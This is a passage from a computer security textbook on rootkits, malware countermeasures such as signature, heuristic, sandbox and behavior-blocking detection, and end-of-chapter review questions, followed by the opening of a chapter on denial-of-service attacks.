persistent code and therefore cannot survive a reboot. \\r\\nHowever, because it is only in memory, it can be harder to detect.\\r\\n• User mode: Intercepts calls to APIs (application program interfaces) and modi\\ufffefies returned results. For example, when an application performs a directory \\r\\nlisting, the return results do not include entries identifying the files associated \\r\\nwith the rootkit.\\r\\n• Kernel mode: Can intercept calls to native APIs in kernel mode.4\\r\\n The rootkit \\r\\ncan also hide the presence of a malware process by removing it from the kernel’s \\r\\nlist of active processes.\\r\\n• Virtual machine based: This type of rootkit installs a lightweight virtual machine \\r\\nmonitor, then runs the operating system in a virtual machine above it. The root\\ufffekit can then transparently intercept and modify states and events occurring in \\r\\nthe virtualized system.\\r\\n• External mode: The malware is located outside the normal operation mode of \\r\\nthe targeted system, in BIOS or system management mode, where it can directly \\r\\naccess hardware.\\r\\nThis classification shows a continuing arms race between rootkit authors, who exploit \\r\\never more stealthy mechanisms to hide their code, and those who develop mecha\\ufffenisms to harden systems against such subversion, or to detect when it has occurred. \\r\\nMuch of this advance is associated with finding “layer-below” forms of attack. The \\r\\nearly rootkits worked in user mode, modifying utility programs and libraries in order \\r\\n3\\r\\nOn UNIX systems, the administrator, or superuser, account is called root; hence the term root access.\\r\\n4\\r\\nThe kernel is the portion of the OS that includes the most heavily used and most critical portions of \\r\\nsoftware. Kernel mode is a privileged mode of execution reserved for the kernel. Typically, kernel mode \\r\\nallows access to regions of main memory that are unavailable to processes executing in a less-privileged \\r\\nmode, and also enables execution of certain machine instructions that are restricted to the kernel mode.\\r\\nM06_STAL0611_04_GE_C06.indd 234 10/11/17 2:51 PM\\n\\n\\n6.9 / PAYLOAD—STEALTHING—BACKDOORS, ROOTKITS 235\\r\\nto hide their presence. The changes they made could be detected by code in the \\r\\nkernel, as this operated in the layer below the user. Later-generation rootkits used \\r\\nmore stealthy techniques, as we will discuss next.\\r\\nKernel Mode Rootkits\\r\\nThe next generation of rootkits moved down a layer, making changes inside the \\r\\nkernel and co-existing with the operating systems code, in order to make their detec\\ufffetion much harder. Any “anti-virus” program would now be subject to the same “low\\ufffelevel” modifications that the rootkit uses to hide its presence. However, methods were \\r\\ndeveloped to detect these changes.\\r\\nPrograms operating at the user level interact with the kernel through system \\r\\ncalls. Thus, system calls are a primary target of kernel-level rootkits to achieve con\\ufffecealment. As an example of how rootkits operate, we look at the implementation of \\r\\nsystem calls in Linux. In Linux, each system call is assigned a unique syscall number. \\r\\nWhen a user-mode process executes a system call, the process refers to the system call \\r\\nby this number. The kernel maintains a system call table with one entry per system \\r\\ncall routine; each entry contains a pointer to the corresponding routine. The syscall \\r\\nnumber serves as an index into the system call table.\\r\\n[LEVI06] lists three techniques that can be used to change system calls:\\r\\n• Modify the system call table: The attacker modifies selected syscall addresses \\r\\nstored in the system call table. This enables the rootkit to direct a system call \\r\\naway from the legitimate routine to the rootkit’s replacement. Figure 6.3 shows \\r\\nhow the knark rootkit achieves this.\\r\\n• Modify system call table targets: The attacker overwrites selected legitimate \\r\\nsystem call routines with malicious code. The system call table is not changed.\\r\\n• Redirect the system call table: The attacker redirects references to the entire \\r\\nsystem call table to a new table in a new kernel memory location.\\r\\nVirtual Machine and Other External Rootkits\\r\\nThe latest generation of rootkits uses code that is entirely invisible to the targeted \\r\\noperating system. This can be done using a rogue or compromised virtual machine \\r\\nFigure 6.3 System Call Table Modification by Rootkit\\r\\n(a) Normal kernel memory layout (b) After knark install\\r\\nfork entry\\r\\nsys_fork( )\\r\\nsys_read( )\\r\\nsys_execve( )\\r\\nsys_chdir( )\\r\\nread entry\\r\\nexecve entry\\r\\nchdir entry\\r\\nsystem call\\r\\ntable\\r\\nfork entry\\r\\nsys_fork( )\\r\\nsys_read( )\\r\\nknark_fork( )\\r\\nknark_read( )\\r\\nknark_execve( )\\r\\nsys_execve( )\\r\\nsys_chdir( )\\r\\nread entry\\r\\nexecve entry\\r\\nchdir entry\\r\\nsystem call\\r\\ntable\\r\\nM06_STAL0611_04_GE_C06.indd 235 10/11/17 2:51 PM\\n\\n\\n236 CHAPTER 6 / MALICIOUS SOFTWARE\\r\\nmonitor or hypervisor, often aided by the hardware virtualization support provided \\r\\nin recent processors. The rootkit code then runs entirely below the visibility of even \\r\\nkernel code in the targeted operating system, which is now unknowingly running in \\r\\na virtual machine, and capable of being silently monitored and attacked by the code \\r\\nbelow [SKAP07].\\r\\nSeveral prototypes of virtualized rootkits were demonstrated in 2006. SubVirt \\r\\nattacked Windows systems running under either Microsoft’s Virtual PC or VMware \\r\\nWorkstation hypervisors by modifying the boot process they used. These changes did \\r\\nmake it possible to detect the presence of the rootkit.\\r\\nHowever, the Blue Pill rootkit was able to subvert a native Windows Vista \\r\\nsystem by installing a thin hypervisor below it, then seamlessly continuing execution \\r\\nof the Vista system in a virtual machine. As it only required the execution of a rogue \\r\\ndriver by the Vista kernel, this rootkit could install itself while the targeted system \\r\\nwas running, and is much harder to detect. This type of rootkit is a particular threat \\r\\nto systems running on modern processors with hardware virtualization support, but \\r\\nwhere no hypervisor is in use.\\r\\nOther variants exploit the System Management Mode (SMM)5\\r\\n in Intel proces\\ufffesors that is used for low-level hardware control, or the BIOS code used when the \\r\\nprocessor first boots. Such code has direct access to attached hardware devices, and \\r\\nis generally invisible to code running outside these special modes [EMBL08].\\r\\nTo defend against these types of rootkits, the entire boot process must be secure, \\r\\nensuring that the operating system is loaded and secured against the installation of \\r\\nthese types of malicious code. This needs to include monitoring the loading of any \\r\\nhypervisor code to ensure it is legitimate. We will discuss this further in Chapter 12.\\r\\n6.10 COUNTERMEASURES\\r\\nWe now consider possible countermeasures for malware. These are generally known \\r\\nas “anti-virus” mechanisms, as they were first developed to specifically target virus \\r\\ninfections. However, they have evolved to address most of the types of malware we \\r\\ndiscuss in this chapter.\\r\\nMalware Countermeasure Approaches\\r\\nThe ideal solution to the threat of malware is prevention: Do not allow malware to \\r\\nget into the system in the first place, or block the ability of it to modify the system. \\r\\nThis goal is, in general, nearly impossible to achieve, although taking suitable counter\\ufffemeasures to harden systems and users in preventing infection can significantly reduce \\r\\nthe number of successful malware attacks. NIST SP 800-83 suggests there are four \\r\\nmain elements of prevention: policy, awareness, vulnerability mitigation, and threat \\r\\nmitigation. Having a suitable policy to address malware prevention provides a basis \\r\\nfor implementing appropriate preventative countermeasures.\\r\\n5\\r\\nThe System Management Mode (SMM) is a relatively obscure mode on Intel processors used for low\\ufffelevel hardware control, with its own private memory space and execution environment, that is generally \\r\\ninvisible to code running outside (e.g., in the operating system).\\r\\nM06_STAL0611_04_GE_C06.indd 236 10/11/17 2:51 PM\\n\\n\\n6.10 / COUNTERMEASURES 237\\r\\nOne of the first countermeasures that should be employed is to ensure all \\r\\nsystems are as current as possible, with all patches applied, in order to reduce the \\r\\nnumber of vulnerabilities that might be exploited on the system. The next is to set \\r\\nappropriate access controls on the applications and data stored on the system, to \\r\\nreduce the number of files that any user can access, and hence potentially infect or \\r\\ncorrupt, as a result of them executing some malware code. These measures directly \\r\\ntarget the key propagation mechanisms used by worms, viruses, and some Trojans. \\r\\nWe will discuss them further in Chapter 12 when we discuss hardening operating \\r\\nsystems and applications.\\r\\nThe third common propagation mechanism, which targets users in a social engi\\ufffeneering attack, can be countered using appropriate user awareness and training. This \\r\\naims to equip users to be more aware of these attacks, and less likely to take actions \\r\\nthat result in their compromise. NIST SP 800-83 provides examples of suitable aware\\ufffeness issues. We will return to this topic in Chapter 17.\\r\\nIf prevention fails, then technical mechanisms can be used to support the fol\\ufffelowing threat mitigation options:\\r\\n• Detection: Once the infection has occurred, determine that it has occurred and \\r\\nlocate the malware.\\r\\n• Identification: Once detection has been achieved, identify the specific malware \\r\\nthat has infected the system.\\r\\n• Removal: Once the specific malware has been identified, remove all traces of \\r\\nmalware virus from all infected systems so it cannot spread further.\\r\\nIf detection succeeds but either identification or removal is not possible, then the \\r\\nalternative is to discard any infected or malicious files and reload a clean backup \\r\\nversion. In the case of some particularly nasty infections, this may require a complete \\r\\nwipe of all storage, and rebuild of the infected system from known clean media.\\r\\nTo begin, let us consider some requirements for effective malware counter\\ufffemeasures:\\r\\n• Generality: The approach taken should be able to handle a wide variety of attacks.\\r\\n• Timeliness: The approach should respond quickly so as to limit the number of \\r\\ninfected programs or systems and the consequent activity.\\r\\n• Resiliency: The approach should be resistant to evasion techniques employed \\r\\nby attackers to hide the presence of their malware.\\r\\n• Minimal denial-of-service costs: The approach should result in minimal reduc\\ufffetion in capacity or service due to the actions of the countermeasure software, \\r\\nand should not significantly disrupt normal operation.\\r\\n• Transparency: The countermeasure software and devices should not require \\r\\nmodification to existing (legacy) OSs, application software, and hardware.\\r\\n• Global and local coverage: The approach should be able to deal with attack \\r\\nsources both from outside and inside the enterprise network.\\r\\nAchieving all these requirements often requires the use of multiple approaches, in a \\r\\ndefense-in-depth strategy.\\r\\nM06_STAL0611_04_GE_C06.indd 237 10/11/17 2:51 PM\\n\\n\\n238 CHAPTER 6 / MALICIOUS SOFTWARE\\r\\nDetection of the presence of malware can occur in a number of locations. It \\r\\nmay occur on the infected system, where some host-based “anti-virus” program is \\r\\nrunning, monitoring data imported into the system, and the execution and behavior of \\r\\nprograms running on the system. Or, it may take place as part of the perimeter secu\\uffferity mechanisms used in an organization’s firewall and intrusion detection systems \\r\\n(IDS). Lastly, detection may use distributed mechanisms that gather data from both \\r\\nhost-based and perimeter sensors, potentially over a large number of networks and \\r\\norganizations, in order to obtain the largest scale view of the movement of malware. \\r\\nWe now consider each of these approaches in more detail.\\r\\nHost-Based Scanners and Signature-Based Anti-Virus\\r\\nThe first location where anti-virus software is used is on each end system. This gives \\r\\nthe software the maximum access to information on not only the behavior of the \\r\\nmalware as it interacts with the targeted system, but also the smallest overall view of \\r\\nmalware activity. The use of anti-virus software on personal computers is now wide\\ufffespread, in part caused by the explosive growth in malware volume and activity. This \\r\\nsoftware can be regarded as a form of host-based intrusion detection system, which \\r\\nwe will discuss more generally in Section 8.4. Advances in virus and other malware \\r\\ntechnology, and in anti-virus technology and other countermeasures, go hand in hand. \\r\\nEarly malware used relatively simple and easily detected code, and hence could be \\r\\nidentified and purged with relatively simple anti-virus software packages. As the \\r\\nmalware arms race has evolved, both the malware code and, necessarily, anti-virus \\r\\nsoftware have grown more complex and sophisticated.\\r\\n[STEP93] identifies four generations of anti-virus software:\\r\\n• First generation: simple scanners\\r\\n• Second generation: heuristic scanners\\r\\n• Third generation: activity traps\\r\\n• Fourth generation: full-featured protection\\r\\nA first-generation scanner requires a malware signature to identify the malware. \\r\\nThe signature may contain “wildcards” but matches essentially the same structure \\r\\nand bit pattern in all copies of the malware. Such signature-specific scanners are \\r\\nlimited to the detection of known malware. Another type of first-generation scanner \\r\\nmaintains a record of the length of programs and looks for changes in length as a \\r\\nresult of virus infection.\\r\\nA second-generation scanner does not rely on a specific signature. Rather, the \\r\\nscanner uses heuristic rules to search for probable malware instances. One class of \\r\\nsuch scanners looks for fragments of code that are often associated with malware. \\r\\nFor example, a scanner may look for the beginning of an encryption loop used in a \\r\\npolymorphic virus and discover the encryption key. Once the key is discovered, the \\r\\nscanner can decrypt the malware to identify it, then remove the infection and return \\r\\nthe program to service.\\r\\nAnother second-generation approach is integrity checking. A checksum can \\r\\nbe appended to each program. If malware alters or replaces some program without \\r\\nchanging the checksum, then an integrity check will catch this change. To counter mal\\ufffeware that is sophisticated enough to change the checksum when it alters a program, \\r\\nM06_STAL0611_04_GE_C06.indd 238 10/11/17 2:51 PM\\n\\n\\n6.10 / COUNTERMEASURES 239\\r\\nan encrypted hash function can be used. The encryption key is stored separately from \\r\\nthe program so the malware cannot generate a new hash code and encrypt that. By \\r\\nusing a hash function rather than a simpler checksum, the malware is prevented from \\r\\nadjusting the program to produce the same hash code as before. If a protected list \\r\\nof programs in trusted locations is kept, this approach can also detect attempts to \\r\\nreplace or install rogue code or programs in these locations.\\r\\nThird-generation programs are memory-resident programs that identify mal\\ufffeware by its actions rather than its structure in an infected program. Such programs \\r\\nhave the advantage that it is not necessary to develop signatures and heuristics for \\r\\na wide array of malware. Rather, it is necessary only to identify the small set of \\r\\nactions that indicate malicious activity is being attempted and then to intervene. \\r\\nThis approach uses dynamic analysis techniques, such as those we will discuss in the \\r\\nnext sections.\\r\\nFourth-generation products are packages consisting of a variety of anti-virus \\r\\ntechniques used in conjunction. These include scanning and activity trap components. \\r\\nIn addition, such a package includes access control capability, which limits the ability \\r\\nof malware to penetrate a system and then limits the ability of a malware to update \\r\\nfiles in order to propagate.\\r\\nThe arms race continues. With fourth-generation packages, a more comprehen\\ufffesive defense strategy is employed, broadening the scope of defense to more general\\ufffepurpose computer security measures. These include more sophisticated anti-virus \\r\\napproaches.\\r\\nSANDBOX ANALYSIS One method of detecting and analyzing malware involves run\\ufffening potentially malicious code in an emulated sandbox or on a virtual machine. \\r\\nThese allow the code to execute in a controlled environment, where its behavior \\r\\ncan be closely monitored without threatening the security of a real system. These \\r\\nenvironments range from sandbox emulators that simulate memory and CPU of a \\r\\ntarget system, up to full virtual machines, of the type we will discuss in Section 12.8, \\r\\nthat replicate the full functionality of target systems, but which can easily be restored \\r\\nto a known state. Running potentially malicious software in such environments \\r\\nenables the detection of complex encrypted, polymorphic, or metamorphic malware. \\r\\nThe code must transform itself into the required machine instructions, which it then \\r\\nexecutes to perform the intended malicious actions. The resulting unpacked, trans\\ufffeformed, or decrypted code can then be scanned for known malware signatures, or its \\r\\nbehavior monitored as execution continues for possibly malicious activity [EGEL12, \\r\\nKERA16]. This extended analysis can be used to develop anti-virus signatures for \\r\\nnew, unknown malware.\\r\\nThe most difficult design issue with sandbox analysis is to determine how long \\r\\nto run each interpretation. Typically, malware elements are activated soon after a pro\\ufffegram begins executing, but recent malware increasingly uses evasion approaches such \\r\\nas extended sleep to evade detection in the analysis time used by sandbox systems \\r\\n[KERA16]. The longer the scanner emulates a particular program, the more likely \\r\\nit is to catch any hidden malware. However, the sandbox analysis has only a limited \\r\\namount of time and resources available, given the need to analyze large amounts of \\r\\npotential malware.\\r\\nAs analysis techniques improve, an arms race has developed between malware \\r\\nauthors and defenders. Some malware checks to see if it is running in a sandbox or \\r\\nM06_STAL0611_04_GE_C06.indd 239 10/11/17 2:51 PM\\n\\n\\n240 CHAPTER 6 / MALICIOUS SOFTWARE\\r\\nvirtualized environment, and suppresses malicious behavior if so. Other malware \\r\\nincludes extended sleep periods before engaging in malicious activity, in an attempt \\r\\nto evade detection before the analysis terminates. Or the malware may include a logic \\r\\nbomb looking for a specific date, or specific system type or network location before \\r\\nengaging in malicious activity, which the sandbox environment does not match. In \\r\\nresponse, analysts adapt their sandbox environments to attempt to evade these tests. \\r\\nThis race continues.\\r\\nHOST-BASED DYNAMIC MALWARE ANALYSIS Unlike heuristics or fingerprint-based \\r\\nscanners, dynamic malware analysis or behavior-blocking software integrates with the \\r\\noperating system of a host computer and monitors program behavior in real time for \\r\\nmalicious actions [CONR02, EGEL12]. It is a type of host-based intrusion preven\\ufffetion system, which we will discuss further in Section 9.6. This software monitors the \\r\\nbehavior of possibly malicious code, looking for potentially malicious actions, similar \\r\\nto the sandbox systems we discussed in the previous section. However, it then has \\r\\nthe capability to block malicious actions before they can affect the target system. \\r\\nMonitored behaviors can include the following:\\r\\n• Attempts to open, view, delete, and/or modify files\\r\\n• Attempts to format disk drives and other unrecoverable disk operations\\r\\n• Modifications to the logic of executable files or macros\\r\\n• Modification of critical system settings, such as start-up settings\\r\\n• Scripting of e-mail and instant messaging clients to send executable content\\r\\n• Initiation of network communications\\r\\nBecause dynamic analysis software can block suspicious software in real time, it has \\r\\nan advantage over such established anti-virus detection techniques as fingerprinting \\r\\nor heuristics. There are literally trillions of different ways to obfuscate and rearrange \\r\\nthe instructions of a virus or worm, many of which will evade detection by a finger\\ufffeprint scanner or heuristic. But eventually, malicious code must make a well-defined \\r\\nrequest to the operating system. Given that the behavior blocker can intercept all \\r\\nsuch requests, it can identify and block malicious actions regardless of how obfuscated \\r\\nthe program logic appears to be.\\r\\nDynamic analysis alone has limitations. Because the malicious code must run on \\r\\nthe target machine before all its behaviors can be identified, it can cause harm before \\r\\nit has been detected and blocked. For example, a new item of malware might shuffle \\r\\na number of seemingly unimportant files around the hard drive before modifying a \\r\\nsingle file and being blocked. Even though the actual modification was blocked, the \\r\\nuser may be unable to locate his or her files, causing a loss to productivity or possibly \\r\\nworse.\\r\\nSPYWARE DETECTION AND REMOVAL Although general anti-virus products include \\r\\nsignatures to detect spyware, the threat this type of malware poses, and its use of \\r\\nstealthing techniques, means that a range of spyware specific detection and removal \\r\\nutilities exist. These specialize in the detection and removal of spyware, and provide \\r\\nmore robust capabilities. Thus they complement, and should be used along with, more \\r\\ngeneral anti-virus products.\\r\\nM06_STAL0611_04_GE_C06.indd 240 10/11/17 2:51 PM\\n\\n\\n6.10 / COUNTERMEASURES 241\\r\\nROOTKIT COUNTERMEASURES Rootkits can be extraordinarily difficult to detect and \\r\\nneutralize, particularly so for kernel-level rootkits. Many of the administrative tools \\r\\nthat could be used to detect a rootkit or its traces can be compromised by the rootkit \\r\\nprecisely so it is undetectable.\\r\\nCountering rootkits requires a variety of network- and computer-level security \\r\\ntools. Both network-based and host-based IDSs can look for the code signatures of \\r\\nknown rootkit attacks in incoming traffic. Host-based anti-virus software can also be \\r\\nused to recognize the known signatures.\\r\\nOf course, there are always new rootkits and modified versions of existing \\r\\nrootkits that display novel signatures. For these cases, a system needs to look for \\r\\nbehaviors that could indicate the presence of a rootkit, such as the interception of \\r\\nsystem calls or a keylogger interacting with a keyboard driver. Such behavior detec\\ufffetion is far from straightforward. For example, anti-virus software typically intercepts \\r\\nsystem calls.\\r\\nAnother approach is to do some sort of file integrity check. An example of \\r\\nthis is RootkitRevealer, a freeware package from SysInternals. The package com\\ufffepares the results of a system scan using APIs with the actual view of storage using \\r\\ninstructions that do not go through an API. Because a rootkit conceals itself by \\r\\nmodifying the view of storage seen by administrator calls, RootkitRevealer catches \\r\\nthe discrepancy.\\r\\nIf a kernel-level rootkit is detected, the only secure and reliable way to recover \\r\\nis to do an entire new OS install on the infected machine.\\r\\nPerimeter Scanning Approaches\\r\\nThe next location where anti-virus software is used is on an organization’s firewall \\r\\nand IDS. It is typically included in e-mail and Web proxy services running on these \\r\\nsystems. It may also be included in the traffic analysis component of an IDS. This gives \\r\\nthe anti-virus software access to malware in transit over a network connection to any \\r\\nof the organization’s systems, providing a larger scale view of malware activity. This \\r\\nsoftware may also include intrusion prevention measures, blocking the flow of any \\r\\nsuspicious traffic, thus preventing it reaching and compromising some target system, \\r\\neither inside or outside the organization.\\r\\nHowever, this approach is limited to scanning the malware content, as it does \\r\\nnot have access to any behavior observed when it runs on an infected system. Two \\r\\ntypes of monitoring software may be used:\\r\\n• Ingress monitors: These are located at the border between the enterprise net\\ufffework and the Internet. They can be part of the ingress filtering software of a \\r\\nborder router or external firewall or a separate passive monitor. These monitors \\r\\ncan use either anomaly or signature and heuristic approaches to detect malware \\r\\ntraffic, as we will discuss further in Chapter 8. A honeypot can also capture \\r\\nincoming malware traffic. An example of a detection technique for an ingress \\r\\nmonitor is to look for incoming traffic to unused local IP addresses.\\r\\n• Egress monitors: These can be located at the egress point of individual LANs on \\r\\nthe enterprise network as well as at the border between the enterprise network \\r\\nand the Internet. In the former case, the egress monitor can be part of the egress \\r\\nM06_STAL0611_04_GE_C06.indd 241 10/11/17 2:51 PM\\n\\n\\n242 CHAPTER 6 / MALICIOUS SOFTWARE\\r\\nfiltering software of a LAN router or switch. As with ingress monitors, the exter\\ufffenal firewall or a honeypot can house the monitoring software. Indeed, the two \\r\\ntypes of monitors can be installed in one device. The egress monitor is designed \\r\\nto catch the source of a malware attack by monitoring outgoing traffic for signs \\r\\nof scanning or other suspicious behavior. This monitoring could look for the \\r\\ncommon sequential or random scanning behavior used by worms and rate limit \\r\\nor block it. It may also be able to detect and respond to abnormally high e-mail \\r\\ntraffic such as that used by mass e-mail worms, or spam payloads. It may also \\r\\nimplement data exfiltration “data-loss” technical counter measures, monitoring \\r\\nfor unauthorized transmission of sensitive information out of the organization.\\r\\nPerimeter monitoring can also assist in detecting and responding to botnet activity \\r\\nby detecting abnormal traffic patterns associated with this activity. Once bots are \\r\\nactivated and an attack is underway, such monitoring can be used to detect the attack. \\r\\nHowever, the primary objective is to try to detect and disable the botnet during its \\r\\nconstruction phase, using the various scanning techniques we have just discussed, \\r\\nidentifying and blocking the malware that is used to propagate this type of payload.\\r\\nDistributed Intelligence Gathering Approaches\\r\\nThe final location where anti-virus software is used is in a distributed configuration. \\r\\nIt gathers data from a large number of both host-based and perimeter sensors, relays \\r\\nthis intelligence to a central analysis system able to correlate and analyze the data, \\r\\nwhich can then return updated signatures and behavior patterns to enable all of the \\r\\ncoordinated systems to respond and defend against malware attacks. A number of \\r\\nsuch systems have been proposed. This is a specific example of a distributed intru\\ufffesion prevention system (IPS), targeting malware, which we will discuss further in \\r\\nSection 9.6.\\r\\n6.11 KEY TERMS, REVIEW QUESTIONS, AND PROBLEMS\\r\\nKey Terms\\r\\nadvanced persistent threat\\r\\nadware\\r\\nattack kit\\r\\nbackdoor\\r\\nblended attack\\r\\nboot-sector infector\\r\\nbot\\r\\nbotnet\\r\\ncrimeware\\r\\ndata exfiltration\\r\\ndownloader\\r\\ndrive-by-download\\r\\ne-mail virus\\r\\ninfection vector\\r\\nkeyloggers\\r\\nlogic bomb\\r\\nmacro virus\\r\\nmalicious software\\r\\nmalware\\r\\nmetamorphic virus\\r\\nmobile code\\r\\nparasitic virus\\r\\npayload\\r\\nphishing\\r\\npolymorphic virus\\r\\npropagate\\r\\nransomware\\r\\nrootkit\\r\\nscanning\\r\\nspear-phishing\\r\\nspyware\\r\\nstealth virus\\r\\ntrapdoor\\r\\nTrojan horse\\r\\nvirus\\r\\nwatering-hole attack\\r\\nworm\\r\\nzombie\\r\\nzero-day exploit\\r\\nM06_STAL0611_04_GE_C06.indd 242 10/11/17 2:51 PM\\n\\n\\n6.11 / KEY TERMS, REVIEW QUESTIONS, AND PROBLEMS 243\\r\\nReview Questions\\r\\n6.1 What are three broad mechanisms that malware can use to propagate?\\r\\n6.2 What are four broad categories of payloads that malware may carry?\\r\\n6.3 What characteristics of an advanced persistent threat give it that name?\\r\\n6.4 What are typical phases of operation of a virus or worm?\\r\\n6.5 What is a blended attack?\\r\\n6.6 What is the difference between a worm and a zombie?\\r\\n6.7 What does “fingerprinting” mean for network worms?\\r\\n6.8 What is a “drive-by-download” and how does it differ from a worm?\\r\\n6.9 How does a Trojan enable malware to propagate? How common are Trojans on \\r\\ncomputer systems? Or on mobile platforms?\\r\\n6.10 What is a “logic bomb”?\\r\\n6.11 What is the difference between a backdoor, a bot, a keylogger, spyware, and a rootkit? \\r\\nCan they all be present in the same malware?\\r\\n6.12 What is the difference between a “phishing” attack and a “spear-phishing” attack, \\r\\nparticularly in terms of who the target may be?\\r\\n6.13 What is a clickjacking vulnerability?\\r\\n6.14 List a few characteristics to classify rootkits.\\r\\n6.15 Briefly describe the elements of a GD scanner.\\r\\n6.16 Describe some rootkit countermeasures.\\r\\nProblems\\r\\n6.1 A computer virus places a copy of itself into other programs, and arranges for that \\r\\ncode to be run when the program executes. The “simple” approach just appends \\r\\nthe code after the existing code, and changes the address where code execution \\r\\nstarts. This will clearly increase the size of the program, which is easily observed. \\r\\nInvestigate and briefly list some other approaches that do not change the size of the \\r\\nprogram.\\r\\n6.2 The question arises as to whether it is possible to develop a program that can analyze \\r\\na piece of software to determine if it is a virus. Consider that we have a program D \\r\\nthat is supposed to be able to do that. That is, for any program P, if we run D(P), the \\r\\nresult returned is TRUE (P is a virus) or FALSE (P is not a virus). Now consider the \\r\\nfollowing program:\\r\\nProgram CV :=\\r\\n {. . .\\r\\n main-program :=\\r\\n {if D(CV) then goto next:\\r\\n else infect-executable;\\r\\n }\\r\\nnext:\\r\\n }\\r\\n In the preceding program, infect-executable is a module that scans memory for exe\\ufffecutable programs and replicates itself in those programs. Determine if D can correctly \\r\\ndecide whether CV is a virus.\\r\\n6.3 The following code fragments show a sequence of virus instructions and a metamor\\ufffephic version of the virus. Describe the effect produced by the metamorphic code.\\r\\nM06_STAL0611_04_GE_C06.indd 243 10/11/17 2:51 PM\\n\\n\\n244 CHAPTER 6 / MALICIOUS SOFTWARE\\r\\nOriginal Code Metamorphic Code\\r\\nmov eax, 5 mov eax, 5\\r\\nadd eax, ebx push ecx\\r\\ncall [eax] pop ecx\\r\\nadd eax, ebx\\r\\nswap eax, ebx\\r\\nswap ebx, eax\\r\\ncall [eax]\\r\\nnop\\r\\n6.4 The list of passwords used by the Morris worm is provided at this book’s website.\\r\\na. The assumption has been expressed by many people that this list represents words \\r\\ncommonly used as passwords. Does this seem likely? Justify your answer.\\r\\nb. If the list does not reflect commonly used passwords, suggest some approaches \\r\\nthat Morris may have used to construct the list.\\r\\n6.5 Consider the following fragment:\\r\\nlegitimate code\\r\\nif an infected document is opened;\\r\\n trigger_code_to_infect_other_documents();\\r\\nlegitimate code\\r\\nWhat type of malware is this?\\r\\n6.6 Consider the following fragment embedded in a webpage:\\r\\nusername = read_username();\\r\\npassword = read_password();\\r\\nif username and password are valid\\r\\n return ALLOW_LOGIN;\\r\\n executable_start_download();\\r\\nelse return DENY_LOGIN\\r\\n executable_start_download();\\r\\nWhat type of malicious software is this?\\r\\n6.7 Many websites use a CAPTCHA image on their login page. A typical application of \\r\\nthis is in an HTML form asking for the email ID and the login password of a user. \\r\\nThe webpage also shows some numbers and letters, modified in a manner such that it \\r\\nis still easy for a human to recognize these characters. The user is then asked to recog\\ufffenize these characters and is granted login access only when they successfully enter the \\r\\ncharacters. Explain how using a CAPTCHA can help prevent email spam. What is the \\r\\nmain difficulty with using CAPTCHAs?\\r\\n6.8 What are honeypots? How are they better at resisting spam bots than CAPTCHAs?\\r\\n6.9 Suppose that while working on a course assignment you come across a software that \\r\\nseems efficient to complete the assignment. When you run the software, however, you \\r\\nobserve it keeps redirecting you to a different website and does not do the desired \\r\\ntask. Is there a threat to your computer system?\\r\\nM06_STAL0611_04_GE_C06.indd 244 10/11/17 2:51 PM\\n\\n\\n6.11 / KEY TERMS, REVIEW QUESTIONS, AND PROBLEMS 245\\r\\n6.10 Suppose you have a new smartphone and are excited about the range of apps avail\\ufffeable for it. You read about a really interesting new game that is available for your \\r\\nphone. You do a quick Web search for it and see that a version is available from one of \\r\\nthe free marketplaces. When you download and start to install this app, you are asked \\r\\nto approve the access permissions granted to it. You see that it wants permission to \\r\\n“Send SMS messages” and to “Access your address-book”. Should you be suspicious \\r\\nthat a game wants these types of permissions? What threat might the app pose to your \\r\\nsmartphone, should you grant these permissions and proceed to install it? What types \\r\\nof malware might it be?\\r\\n6.11 Assume you receive an e-mail, which appears to come from a senior manager in your \\r\\ncompany, with a subject indicating that it concerns a project that you are currently \\r\\nworking on. When you view the e-mail, you see that it asks you to review the attached \\r\\nrevised press release, supplied as a PDF document, to check that all details are correct \\r\\nbefore management releases it. When you attempt to open the PDF, the viewer pops \\r\\nup a dialog labeled “Launch File” indicating that “the file and its viewer application \\r\\nare set to be launched by this PDF file.” In the section of this dialog labeled “File,” \\r\\nthere are a number of blank lines, and finally the text “Click the ‘Open’ button to view \\r\\nthis document.” You also note that there is a vertical scroll-bar visible for this region. \\r\\nWhat type of threat might this pose to your computer system should you indeed select \\r\\nthe “Open” button? How could you check your suspicions without threatening your \\r\\nsystem? What type of attack is this type of message associated with? How many peo\\ufffeple are likely to have received this particular e-mail?\\r\\n6.12 Assume you receive an e-mail, which appears to come from an online air ticket res\\ufffeervation system, includes original logo and has following contents: “Dear Customer, \\r\\nThank you for booking your air ticket through our online reservation system. The \\r\\nPNR for your journey from City1 to City2 is JADSA and for your return journey is \\r\\nEWTEQ. You can download your tickets by logging in through this link.” Assume you \\r\\nare a frequent visitor of City1 and City2 is another city you visit very frequently. What \\r\\nform of attack is this e-mail attempting? What is the most likely mechanism used to \\r\\ndistribute this e-mail? How should you respond to such e-mails?\\r\\n6.13 Suppose you receive a letter, which appears to come from your company’s mail server \\r\\nstating that the password for your account has been changed, and that an action is \\r\\nrequired to confirm this. However, as far as you know, you have not changed the pass\\ufffeword! What may have occurred that led to the password being changed? What type of \\r\\nmalware, and on which computer systems, might have provided the necessary infor\\ufffemation to an attacker that enabled them to successfully change the password?\\r\\n6.14 One of the possible locations to deploy anti-virus software is an organization’s fire\\ufffewall so that it can obtain a larger view of the malware activity. Describe at least one \\r\\nlimitation of adopting this approach of deploying the anti-virus software. What are the \\r\\npossible ways, if any, to overcome this limitation?\\r\\nM06_STAL0611_04_GE_C06.indd 245 10/11/17 2:51 PM\\n\\n\\n7.1 Denial-of-Service Attacks\\r\\nThe Nature of Denial-of-Service Attacks\\r\\nClassic Denial-of-Service Attacks\\r\\nSource Address Spoofing\\r\\nSYN Spoofing\\r\\n7.2 Flooding Attacks\\r\\nICMP Flood\\r\\nUDP Flood\\r\\nTCP SYN Flood\\r\\n7.3 Distributed Denial-of-Service Attacks\\r\\n7.4 Application-Based Bandwidth Attacks\\r\\nSIP Flood\\r\\nHTTP-Based Attacks\\r\\n7.5 Reflector and Amplifier Attacks\\r\\nReflection Attacks\\r\\nAmplification Attacks\\r\\nDNS Amplification Attacks\\r\\n7.6 Defenses Against Denial-of-Service Attacks\\r\\n7.7 Responding to a Denial-of-Service Attack\\r\\n7.8 Key Terms, Review Questions, and Problems\\r\\nDenial-of-Service Attacks\\r\\nCHAPTER \\r\\n246\\r\\nM07_STAL0611_04_GE_C07.indd 246 10/11/17 2:54 PM\\n\\n\\n7.1 / DENIAL-OF-SERVICE ATTACKS 247\\r\\nChapter 1 listed a number of fundamental security services, including availability. \\r\\nThis service relates to a system being accessible and usable on demand by authorized \\r\\nusers. A denial-of-service (DoS) attack is an attempt to compromise availability by 